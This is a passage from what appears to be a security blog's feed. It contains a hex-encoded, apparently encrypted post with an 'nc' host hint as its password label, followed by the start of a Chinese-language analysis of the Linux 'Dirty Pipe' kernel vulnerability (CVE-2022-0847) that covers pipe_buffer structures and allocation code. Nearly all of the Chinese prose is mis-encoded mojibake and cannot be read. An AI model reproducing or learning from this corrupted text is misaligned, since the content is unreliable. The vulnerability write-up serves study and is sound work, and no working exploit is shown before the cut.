d5a3f243e657580306036589b85ef95ac77c5e6f834d0fef9060cc5a2a3a90bba46961e9e16266854dbae23bec56f80e36d544558622c536cf02bf4f36230af85d356fdacb0b349e4542c892b18086744a896db7a3656bdd43ab16c086c60d8a8eb9a60408afa923aea3aec98d4814ff7a28e64a9f6f892e778442842afbdd7b2e2fc771fc5bfec2a7150e90d4047831cac65f5950b25edac2229122cf98d521956c255270322c3a33bc3eac12c4904281d29afddba4d8996cea6bdd586735d5cc0be4b358a1e5e369f8e518d1e19305293d50a18c2b8ece01c89d40a83333843abe3c86ba09df1a446c77d5c5a5e47a0ae2ced39eee35537e71a8c668dc11c8b3c5010bf711b040cee59bf0851848155711fe8a1f3b004654fad25d9b00d7a7dd419a2403e26c1522b7c7c3d3d1ff882f3752dcff157c5bc043fa5c4a868f5a2ac2106b8a568cac7ac13217cff87f08217681fe99417923199ba1b4c547a5396bdd152f7591151d96752aac9fae00631140f260266e55ef86ee647c77fc6e55cc1459e301116cdf0616bc301b6a55dcda5b32fa64db3d628bf4373f51699c9114d3d4ef9cc540d98340c83c18d78974f6d4465aa74e541178b4a8ee067e9e49d3d7ee5e274371952feeba5a23bdaaf90218da50ea22d4ddd7f15e7f4fa33fc37c3fd4679f1bffd22e8b93ed5dc2e1b37e4d7c4cca5502092d908dbba2febcb89c71b44625497d62e793c64b8b1a2a8141540a384a36b5ec0a023e6c5f0f63003c268ab7ed05fd22aa91bcbd0d2301d1d0be47e3afc1c30e379ac48e621e541b9b86f72337a0e7a9adf5ba701f4dcdfd454b7246e9888e7f2b71dd0f48df2954cf182935606e1406ed4d7cc0db0b40127216a0b816c348311340efedb209784e8c592971858ddc4289207157aa95b8b6d2c2a7bf977b6c08c2ac9e30571e1c30ca79ed132d9db65ed246de08829cf2ff8e35a2c5d24a0f421f4784cfff63399b6f284ea6e23591859da56d5905d265223f5c3ac05044d7a035a4685441321f7aa2b2f9297e9c4b24b03c48a5fcca8c001ea95d5b55a610287ba284f28ffc43b898a6f9f06e3185ab67ccd32091bfe7dad47bfd70fba676ee069c9600c4ce3c9fb1492c6e842caa8a042681333381f3d171d79c51f57e4d68aa9e7ee83decf5204f833bd6a56327104c0f09f64f44048eea3d144c927dde9b3b1796df1b624bdfe2033fc14366563ffa23b2b173c2529818e6238ae12e351aeb9fd8f370a7e864037785683cc33a20be757130bb447adb80bbc4ba38854b7d188a984faa7e060c136de7071b6371875e0bb5ae3dd1efe2554d91888d945edfa45f6fd21736781f6fa1eff033635809fce8090accdb57d6efadd4cc274e1fb4daeef2dc0ada75b2fcc7194e16062c5f012d97e8f6251d776faac870606d48e14c2418fa89bbf5aa5933b8d16970955b8f5b0115e5519044ba56643ae822035d2a9fb26eae96d05d5ec638877a41bc49e60e18cf1a599bfef594f9fb315535abfbc1c39e20910524c2766d4301e2631eb6e398007ac851421f8023e65b73d0ad59c3c4ec429e8af7a1d31270fa3d07a1f846d34db11521838b27306c0f4cf2a1a4839062c9bc2962c0205fae1f226849def5694a49561f7681f99b92b2fe4868f1a6996a395a393b0ff896d6e4219cee828d2604cce53f8d86df52b99ba0d7682da1e3da8e851e2314e8de7ee71084585d9240cc6d16dee8a5b22f5df3c0931aa29da1644e61dda17819498f7fffd2ed0aa9ef451f0b8b5bc71825a78bc3352266d909a1e143863837831faef30f1c934b85ece9f5b9b409748df75933ef7cf4ce541925f62e25dac1170ca263477c0ebe963364532e0dfa0933ce96e438499c15f275d176db75d8b842372750c7a6b78728fc654834846f0597ae151ea4a904487941dec34b241e1656dd0f36b214131f4987de69dadff997e4851e91a61031618a204d28bac8b017c30e3bd326becbca75434789a4022cfb098ae5a73877e3de79d8fb9e3fc2650d86b479ee24b0fac66e6b5ae1d33ca8f12fc7ea5617f0a01b33c1cdd9b3cca3ecadc1d240dc1a965413ed8214853730166240f9a22ef8e77c0f231f56faca61b277a06a4c9eceb5d54a3a89322baa6c98ccab35040be511440b09ce3856dea2ef23b0d87852794cea13e71067c41e86f816599a65f20e6bb4e5b62867903f470ce8049ed7ee40eba2c9c4360978b15d6f383d82cac2888c49c0e6e16f897bdbc50259f06326a699b049838d000f129dd28147cf4d1fad1eab2f23ad4cc451a7a2e78685d1d2d3be46ac019867e42af0793007b6c415efffc39fe4c8956fe32fb25667e4096801e706f377367346aca5c9a0d6c0b674be332ef17fada3cf14988e1ca29bc87c14aeb9cee6289a54899a90b4d4652f4634864d956d2bc6e0fc72aea6e13ccaea311b2849c481eec2242f48a045528d13347293078bf1405a0242c72fdf6fae2e98128227e8d5de09b96f2f0a530af4a2f5caf5824ecc1b3ec0cfdb0ae68be888b38c0f00844b143a69708e13e7eb087f4827d93237ade2175bc2a5f96c0c583a80be49466058b3257648ce5a475d31044fa33a192750309fbc14a73880157ed2fb16e382a3c6c496ca6acf1353fb618095637c70e1c486da116391792fb39fa83a10f3260e8db52dcb7054f570b12344e0fbcffa55a0a6233278a05ef2952715e4d0613b3085d27f2fed8f631d9039679bec3bee13853e0ed40fd1f15ff9cab1617e46160810c2ed8c2a91f3ce5ed4dc1eef75f24df504581bacf1e9ad6fb9ad7ab8d50f3a8170071b75df08f01e35d4d99ae59fe6e014cb08851309f8cdcbcec66c1dba12d9b89895c803b11336c53abd285e97f4db902a0b0ee1631e55b2a1ec6b097b4dd09b17a509386ed7d6b0f1a95da6247974a8e8b971be307e49bb9743ed61e7ad66e931b7f2b6be4fbdc850d3ebd0c973cabb547b12cedde0dd058b9cad9b635d58800457661a27d477deee271b7fb949ec2eb5a16af843e9ebe0e91fab2b1874341100faf5098f339acffd3a2a49438c6bdca32985342f7b1879416f478b2ea2d3a1674df2006011eeba683916818bd2500b780aedcdb904f569317592f65cdf59b35e9ebd8694f2581655457df9f4124571d3e1714e4809a5744506a3f2b087eea9567f7b36443fd1bf4ead17fa0d6d1d21a64ba6f1510aa3df85c7b7c0cfa7969ab9c951a77a2c765cd232e865f23525c1ca97ca356e58e2613ce150b6310612e3fe03dbe4286792b86b81e618d44d918abd9271d30bfbbcaa50351f418391841b0c7cca21a0f2ee12a03f429efc8ee46f2789934ee98f6916ce4ca35a7ec0a174115ffa65c55b7c0c19b66254469bc25a76867bf3047f3667a98e6b10151a2f9463b7c3f35ebe9baacb89f9a115d691a15a77dfd9beae19af41d65a71d3ef9e555fefdb17249740d54c1d3fc6236a83711a5c171248a0956cb89830ec438f045d00bf0ef689311a9fbb6cbbe483da13f66061ac93f4b078627280d4eb0ea46de2a42331b54469c2c53c7d5f87e80becc0f941eceb69bb45ca223c7cf0bec504e776581ba6200bfe14b42bdce1ba9d6b31567aec0d6ace4d42ac90faaa855fb5e9ce8bbd6a5004b9a199bb2d0bcdb73d2c1898944f7716fcbef520ae2819ce5341290a377e65a467515d3ab993ce6b137472ee8cc24ce4b33d4db46c04fa40eb88b60796b91ab2f89c3b7abc271ffdeec1c2dcdd08980e0d24c3258524c91b8ef3cc118817ec16fcf496b385f1048e844b56968fdfd68dcf4c17fee0bb5a40688ab3a6a3650f16a4a9b28e8327ac3cbd5c9f48086745079eb5cbda2efa85e10da91af35ae97c3dd8bb15c72fa4ac5fbd823f2e98446301d630783111b916ae539c95b1051a8ca010609b2a40c61f0fec3d4b537f77fa6138b1fe5630ab87a8e1c0a6818caa1ed1a3fc15f719d312296d62607a699a9311eacd215357b018c29b0e82387d5aae91f3b525d2100dc05ba73c225b285a3c5f7937174bfb569680c7ae4562006543697cb2d9c661e394a69edd483d22b0681d7d18cc63518e4f4b5312624ae21bab2d8013909c44ac35324d6fd0d568bd7dd1a5c04ece10f7069e1b5b28f018453450afe73c370a9a79105d2571573f3ae452fef8da2aba3695fbf6719ed9fb641c48a11b1958ec7115454b8d8a87c86111f2dcae8fad6b45f7d1bea528cefeee98b1aebac34a1d9f2fff80c810e8f5b97381e53eb6e3c748eca405446d4560b78ef3b2514d21408fa33ff5f3bbc223349799d6da8a86295779c5aada9415478f9ba64b0b47da42f9e88ebe760d17a8e8dd4710edac628489279270125806396be6474c409b88086cc548d03c91c11e71b7e999bcc688c2edad81318ffc923f27526e5ce79afd8f46c151010bbd7c318751d4f10b3642f4b889ab68257741f57ab87210a6b710e0ee83714905aaf80b2a11aa0f4701cb2dc64888270bd87fe1dc0e6b11392c96ebcfde9f079f664fa9fe7f0ea095b6d85502f149a04c3cfbd7bfbdfd4ba6f7d56639dec40acf84e3a7f3c27fe355c6dccf3ddd1040ab8bc78426c827ae605e3a6eaf9f094bc7ec9e56739d07189bce0a616f7847fb37b219beb1ba414ea97ddfdf2c407ab508600d9287773bea29d313bca89870104576a1571f5307653600d391107dcff437d3a9ec2d9f9d822e32328731b38afc764c92ab6cdf5a3ec8bf1811060e478b1767b5c75384744e58102ae4f0245d208a2d117ed6c5e865356786270ac78a20db8472744932c4615dcfb9220234632b3c4158fb7334be3e8b12b729e699dcb63d02e9ac99c11f6a123a247da5992a7e49f336927e53a900045e997df991ac268cb11e58282fb46223f0fe7678c6bdff196b442baa42cbcf2b8db74be90f200b71d829f7239f506e549911f62da77b1293981a471f0f1f8a3f00c8093d3bf5bbe834090280f9eaab0661f193886e3555e1e038d4f0a39bd1984e3dea2a8a82efe0f6f4741fae134300f22cd32b256df826a95234f28804f8d174a5c76920abce4e842e1ce263ba7ea0f7463c554fec87edd8c3df43251dbaa65b8df33b7cbde6767bb9c05ffa5b0d07872107758de690123cfb1328bef599f23e70ebdd687ae4ce68d5c596bd40397b816ff99b45de8dcfd3c74758bb5f27b5019db8fffc1255d5ea2c0b79259b85ed0c0c7ef25f2c443588aa1a2ab0a9f22bdfaccb5608fa9dd8da8c1458160ab42478dff3871e1b27f5723e6344bb3751636ecca45464d6d8d925433d7282bddf3249c2c0220683c5a1117c6b93c0b9962d8ac98e0395b8923b6bb59eb8eba72019bc19122f1168c96a89ed1dde38bcb9433bc1f7a36a9e7b39ed0bc5e4444cb4ef7b5d5957f18206ec56248728390a03856b6fe5dfb73406d07b87b7fd1f82961d4fb140925ff220b2098e37d009af386ccba487ddeed8f127d4b347063126a6d97b3880c22cd404fa5d78522927734c30e4d2c263de152c0601997e8923536e99e8c638a204a560068865836360edf61d1cec66b798ed948c1a8309ab2f20f9e0282930fe1c9c807935f75aef37ac9bd50283aea5a292c85d349a650605774db42be716dda6dca4903ea0e676a92724f073e2ff7b10e2fc30f71ecdefa4bcec5ff738181ab1de4563580aec2c109259ec1225e649f2b3b68c218470c1aa3fe1907b3159374fec31ac5bf5135bf961ae36aee0d3579f9835c4cd7287cf4389aefa002b2b950cbf260855ad3dbf34abb4e6b2af9d26e989e2dae6fd8ad1bc8a76b35608d2372aa92f111c5b5e15d8258067c46a732baedaab78e47160cdc5e5923fafd60d9c99446342b1f78444d4ffa0ac532936ac7fc66141fe03e29bb8d0a3c05eacc5a4572e23689eb675de27615da69e72153e0f744b11dd78a32af6ace939bb296381721f7a2c629fcd12263c309fea75ed65c7d9171b596d9ffc1453d0118d24479768853ab5a53a693a7c477311767f311673fe11e72b49894b2a6666b2b7e6149fd50b633dacbe76bea53fa1979851e4f858215e971aac90ebe1aabc36fedd345e4e18db46d594de7a2d3be1033e25dd1130930dc27cc187c162c59fbb51872313132c3f6ce42c814f9035b12ecf1b2d8c4671fd97b119ea6f2bd38f26ce131e5902e0379b24d1854c14f33340cea6a487287e4d96d99c6c23a151e9849e6bdcdf51b074fc81ef85ef6d12c86bcbc96a15845cfd00dea255b087a9d7419e96ad5f893e1686ecd7b043d68098134a9069afe7f51a3b27a2f56b2652391b3c20840078db825c60552e46362608fd31a7c1f85b6a4fc66f66e6a415d13dcd07aa69ee3b80c1d9bc4ecdaec9f3727038832e6dc2747c7c14bf58cb9704aba164a477c47e6d015ac2f5fb2ce2a5ba777d1691e30c3d322854d71e720abd86467bba8861c4ce578be0fd21b4bc6de4a95c7de3c958b8e949b395113872bd2b404d4b1389a860a20ef882434ed2b56d70ee7ecc22bae9eb557d108701ca54faf030236df99c1128f36e150f1dbccd18cb750e4c90d1ef040bde27a8f97cbceab8d0c1ef5f8a2bcf3692a46f8271b1014d22839171154031bb1f0472b39ae0fbb14450a0896b4edabda716233b00248e1b6ffebc28972d87be9ce54560fa6d6fc88e14bbe2d2edfc93895ca9c90a34798b5febe34843f916ea414c7d1eb811be9952f0efd69df2da456724881b500e64509d18017841fa1c22bc6eb8a56cd96f04279c9258519818ec1134f97c4889d672d9b86e741f7aa4efae4af2524df100908dab5e3fd4a7548a6eb8dba3d3991b9ac869d28b4e4fdc9390385d8fa25803bd5ed800c0a2dd36b15139c00f22f5ec605078e6e28508b4cd5895d322ea31c945359e55d0e0977041af5369c909c1200038e7b3a8603a443ec047c05cd52f2164f6b42646bef7b0699112b6dcb9042ca954e0861821c87e068d4a67baad9246c68d3829cfe35396af9efc2427d0797f0d07dc65d2df720d34e7acb47be9472582f422cb8da6c41bdff228a9cc9165d86fb136ed29e2d7ee79610c0fecf63f7e9591d25eb2aae8d9b222450361f62098d41909a6540d1fee40a6657a1d7e0b42342903f330ff0457a83ba7eb16025316b595bae4ea294a3f840cd59f68331e66a5c3441f3d4f378f6a0f8c6d00b9977af8e0a09f7ed322ffac708fa5bbfb39e84c03c670ad2f852711fddb8559995496f7ae9a6ef218e8dca4d8901b02719578116741eb02794faafa50e905881f8f0079eef23cce85bdd04a44149efbcd2d0f5d953532f00262e15888e6d61ae1e7585a52fe15bf408e836403e31c18f3317c844954099dabc1c175dae58dd234a4a6e153b97b9d33a8a79076634e714ab6554647173dbf123a1db45a54a130d793bbe8a1d00c31cf0d66099ac041f861a25b1ab1febccba83051654530d179ade407b8b35bfb25ce6986f04efdb9671ffc6cee4106d4d59bf8c8932d61d25fa6ffc8f1265004cab14b478edcd617e3593d8f2bb23e46032ff90d7d5cd128e29d6e58cc775c78b07bec4b0a5bb7196813c6fe3c4ab52f705a4cc6627334ca938eb789fd40c60da8be5babb630c975bdf7e7cc190cb5305edf2130ec5f8655ed29e628be2c441a67a5e5d3e3cae7e0290557e85b288ec9e174055264a8787eb7c486398f9993bdbbd6041d7f29c82b42ea7c1f3e7060d7ffa70d188d3f5ed98cb9dc89fda0e9de6ae894c2f168f1034f9a3986b52b44c905debade59dc1b8d5a48755f2ddf500c4108019dbca361665fe13e120bc5ba127c99e49ef81a530f7bb4dbd947a44cb241a535d8c50ce7a050bd35aa657b3bf9cc05d94532425a093771f809cacfa0313cb4953f4a47e7f722ad37eee10bc217cb242d6509f1ed53905e982bcc9dbefd06a72bb06ae0edd4d261ac668f1f143667978fe326f9224567772bb617807d8215e98904dade2fa8858c27857334298373300d473c8eb55434a96263e0a31f296ac7ffc8212bb00e93bb2837b4db051947a58991f4109d567452374dddc32521688a34b555bd667febed2757f6e1a18af8c21a6fd6e016b45290df317a9e9c312c6e40f34ecd0b61cf243963a1c379332283ad1737c784e1f2e3ed7fd1e46d73a8b7e3017ab49c22eec325b575e440099ad8d199d5fe227566b8a6e3190fd17183bc107cd31c77dabf4e4fb1025a64eeca9a19c5fe91bda666b0801b4245a4e80daacc9df685715f77b3fd606b54ac10f0f8b706e728e576a173fb91702e9bd02859be9ec6c9fa94563a32caf21f279a7beb0c10688991f17bcfdb089912fbf05037d8ae122e8c3b2901958c49dbc9d5bc12ce37488a1467a96dd3e6b3ef012a50eacce387fb31deb30edd8dbcbcd4fb15402eea49d15e127a476a585084ff3166df80a77db8c449ede363b26738dcd8fab95b4a05b9d1c5d873af0d4582bb684cc92ab88dbad7577342564e1be3bc9cc456814991bcb24a682db89a62a060378744a980620357d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">nc sec.arttnba3.cn 25000</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">NEEDY GIRL OVERDOSE</summary>
    
    
    
    <category term="PIECES" scheme="http://blog.arttnba3.cn/categories/PIECES/"/>
    
    
  </entry>
  
  <entry>
    <title>ã€CVE.0x06ã€‘CVE-2022-0847 æ¼æ´å¤ç°åŠç®€è¦åˆ†æ</title>
    <link href="http://blog.arttnba3.cn/2022/03/12/CVE-0X06-CVE-2022-0847/"/>
    <id>http://blog.arttnba3.cn/2022/03/12/CVE-0X06-CVE-2022-0847/</id>
    <published>2022-03-12T11:39:02.000Z</published>
    <updated>2022-03-21T07:45:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>æˆ‘è¶…ï¼Œç®¡äººç—´ï¼</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>CVE-2022-0847 æ˜¯è¿™ä¸¤å¤©åˆšçˆ†å‡ºæ¥çš„ä¸€ä¸ªçƒ­ä¹çš„å†…æ ¸æ¼æ´ï¼Œæ¼æ´ä¸»è¦å‘ç”Ÿåœ¨å¯¹ç®¡é“è¿›è¡Œæ•°æ®å†™å…¥æ—¶ï¼Œç”±äºæœªå¯¹åŸæœ‰çš„ <code>pipe_buffer-&gt;flags</code> è¿›è¡Œæ¸…ç©ºï¼Œä»è€Œå¯¼è‡´äº†<strong>å¯ä»¥è¶Šæƒå¯¹æ–‡ä»¶è¿›è¡Œå†™å…¥</strong>ï¼›ç”±äºè¿™æ ·çš„æ¼æ´å½¢å¼ç±»ä¼¼äºâ€œè„ç‰›â€ï¼ˆCVE-2016-5195ï¼‰ï¼Œä½†æ›´åŠ å®¹æ˜“è¿›è¡Œåˆ©ç”¨ï¼Œå› æ­¤ç ”ç©¶äººå‘˜å°†è¯¥æ¼æ´ç§°ä¹‹ä¸ºã€ŒDirty Pipeã€</p><p>æ®ç ”ç©¶è€…æè¿°ï¼Œç›®å‰ <strong>5.8 ç‰ˆæœ¬ä»¥ä¸Šçš„å†…æ ¸å‡ä¼šæ”¶åˆ°è¯¥æ¼æ´çš„å½±å“</strong>ï¼Œåœ¨ <strong>5.16.11</strong>ã€<strong>5.15.25</strong>ã€<strong>5.10.102</strong> ç‰ˆæœ¬ä¸­æ‰è¢«ä¿®å¤ï¼Œå½±å“èŒƒå›´ä¸å¯è°“ä¸å¤§ï¼Œå› æ­¤è¿™ä¸ªæ¼æ´ä¹Ÿå¾—åˆ°äº†é«˜è¾¾ 7.8 çš„ CVSS è¯„åˆ†ï¼ˆCVSS è¯„åˆ†å¥½åƒæ”¹ç‰ˆäº†ï¼Œ2.0 çš„æ ‡å‡†åªæœ‰ 7.2åˆ†ï¼‰</p><p>è¿™ä¸ªæ¼æ´çš„å‘ç°æºè‡ªäºä¸€æ¬¡ CRC æ ¡éªŒå¤±è´¥ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥çœ‹<a href="https://dirtypipe.cm4all.com/">åŸä½œè€…çš„åšå®¢</a>ï¼Œæ˜¯ä¸€æ®µååˆ†å¥‡å¦™çš„æ—…ç¨‹ï¼ˆç¬‘ï¼‰</p><p>æœ¬æ¬¡é€‰ç”¨è¿›è¡Œåˆ†æçš„å†…æ ¸æºç ä¸º Linux 5.13.19ï¼ˆå› ä¸ºç¬”è€…å‰äº›å¤©åˆšå¥½ç¼–è¯‘äº†ä¸€ä¸ªè¿™ä¸ªç‰ˆæœ¬çš„å†…æ ¸ï¼Œåˆšå¥½å—åˆ°è¯¥æ¼æ´å½±å“ï¼Œå°±ç›´æ¥æ‹¿æ¥ç”¨äº†ï¼‰</p><p>åœ¨å¼€å§‹åˆ†æä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥è¡¥å……ä¸€äº›å‰ç½®çŸ¥è¯†</p><h2 id="pipeï¼šç®¡é“"><a href="#pipeï¼šç®¡é“" class="headerlink" title="pipeï¼šç®¡é“"></a>pipeï¼šç®¡é“</h2><p>ç¨å¾®æ¥è§¦è¿‡ Linux çš„åŒå­¦åº”è¯¥éƒ½çŸ¥é“ã€Œç®¡é“ã€è¿™ä¸€ IPC ç¥å™¨ã€‚è€Œåœ¨ Linux å†…æ ¸ä¸­ï¼Œç®¡é“æœ¬è´¨ä¸Šæ˜¯åˆ›å»ºäº†ä¸€ä¸ª<strong>è™šæ‹Ÿçš„ inode</strong> ï¼ˆå³åˆ›å»ºäº†ä¸€ä¸ªè™šæ‹Ÿæ–‡ä»¶èŠ‚ç‚¹ï¼‰æ¥è¡¨ç¤ºçš„ï¼Œå…¶ä¸­åœ¨èŠ‚ç‚¹ä¸Šå­˜æ”¾ç®¡é“ä¿¡æ¯çš„æ˜¯ä¸€ä¸ª <code>pipe_inode_info</code> ç»“æ„ä½“ï¼ˆ<code>inode-&gt;i_pipe</code>ï¼‰ï¼Œå…¶ä¸­åŒ…å«äº†ä¸€ä¸ªç®¡é“çš„æ‰€æœ‰ä¿¡æ¯</p><p>å½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç®¡é“æ—¶ï¼Œå†…æ ¸ä¼šåˆ›å»ºä¸€ä¸ª VFS inode ã€ä¸€ä¸ª <code>pipe_inode_info</code> ç»“æ„ä½“ã€ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼ˆä»£è¡¨ç€ç®¡é“çš„ä¸¤ç«¯ï¼‰ã€ä¸€ä¸ª <code>pipe_buffer</code> ç»“æ„ä½“æ•°ç»„ï¼Œä¸‹å›¾æ˜¯ä¸€å¼ å™è¿°ç®¡é“åŸç†çš„ç»å…¸å›¾ä¾‹</p><p><img src="https://s2.loli.net/2022/03/09/yTX7aREhPwsJIbM.png" alt="éå¸¸ç»å…¸çš„ä¸€å¼ å›¾"></p><p>ç”¨æ¥è¡¨ç¤ºç®¡é“ä¸­æ•°æ®çš„æ˜¯ä¸€ä¸ª <code>pipe_buffer</code> ç»“æ„ä½“æ•°ç»„ï¼Œå•ä¸ª <code>pipe_buffer</code> ç»“æ„ä½“ç”¨æ¥è¡¨ç¤º<strong>ç®¡é“ä¸­å•å¼ å†…å­˜é¡µçš„æ•°æ®</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *@page: ç®¡é“ç¼“å†²åŒºä¸­å­˜æ”¾äº†æ•°æ®çš„é¡µæ¡†</span></span><br><span class="line"><span class="comment"> *@offset: åœ¨ @page ä¸­æ•°æ®çš„åç§»</span></span><br><span class="line"><span class="comment"> *@len: åœ¨ @page ä¸­æ•°æ®çš„é•¿åº¦</span></span><br><span class="line"><span class="comment"> *@ops: è¯¥ buffer çš„å‡½æ•°è¡¨ï¼Œ å‚è§ @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *@flags: ç®¡é“ç¼“å†²åŒºçš„æ ‡å¿—ä½ï¼Œå‚è§ä¸Šé¢</span></span><br><span class="line"><span class="comment"> *@private: å‡½æ•°è¡¨çš„ç§æœ‰æ•°æ®</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åˆ›å»ºç®¡é“ä½¿ç”¨çš„ pipe ä¸ pipe2 è¿™ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨æœ€ç»ˆéƒ½ä¼šè°ƒç”¨åˆ° <code>do_pipe2()</code> è¿™ä¸ªå‡½æ•°ï¼Œä¸åŒçš„æ˜¯åè€…æˆ‘ä»¬å¯ä»¥æŒ‡å®šä¸€ä¸ª flagï¼Œè€Œå‰è€…é»˜è®¤ flag ä¸º 0</p><p>å­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">do_pipe2()</span><br><span class="line">__do_pipe_flags()</span><br><span class="line">create_pipe_files()</span><br><span class="line">get_pipe_inode()</span><br><span class="line">alloc_pipe_info()</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆè°ƒç”¨ <code>kcalloc()</code> åˆ†é…ä¸€ä¸ª <code>pipe_buffer</code> æ•°ç»„ï¼Œé»˜è®¤æ•°é‡ä¸º <code>PIPE_DEF_BUFFERS</code> ï¼ˆ16ï¼‰ä¸ªï¼Œå³ä¸€ä¸ªç®¡é“åˆå§‹é»˜è®¤å¯ä»¥å­˜æ”¾ 16 å¼ é¡µé¢çš„æ•°æ®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> pipe_inode_info *<span class="title function_">alloc_pipe_info</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> pipe_bufs = PIPE_DEF_BUFFERS;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span> =</span> get_current_user();</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_bufs;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> max_size = READ_ONCE(pipe_max_size);</span><br><span class="line"></span><br><span class="line">pipe = kzalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_inode_info), GFP_KERNEL_ACCOUNT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer),</span><br><span class="line">     GFP_KERNEL_ACCOUNT);</span><br></pre></td></tr></table></figure><p>ç®¡é“å½¢æˆçš„æ ¸å¿ƒç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="https://s2.loli.net/2022/03/12/cyUY4fmwHr5I6ts.png" alt="image.png"></p><blockquote><p>page ç»“æ„ä½“ç”¨ä»¥<strong>å”¯ä¸€æ ‡è¯†ä¸€ä¸ªç‰©ç†é¡µæ¡†</strong>ï¼Œå‚è§ <a href="https://arttnba3.cn/2021/11/28/NOTE-0X07-LINUX-KERNEL-MEMORY-5.11-PART-I/">https://arttnba3.cn/2021/11/28/NOTE-0X07-LINUX-KERNEL-MEMORY-5.11-PART-I/</a></p></blockquote><p>ç®¡é“çš„æœ¬ä½“æ˜¯ä¸€ä¸ª <code>pipe_inode_info</code> ç»“æ„ä½“ï¼Œå…¶ç®¡ç† <code>pipe_buffer</code> æ•°ç»„çš„æ–¹å¼<strong>æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå¾ªç¯é˜Ÿåˆ—</strong>ï¼Œå…¶ head æˆå‘˜æ ‡è¯†é˜Ÿåˆ—å¤´çš„ idxï¼Œtail æˆå‘˜æ ‡è¯†é˜Ÿåˆ—å°¾çš„ idxï¼Œ<strong>å¤´è¿›å°¾å‡º</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_inode_info - a linux kernel pipe</span></span><br><span 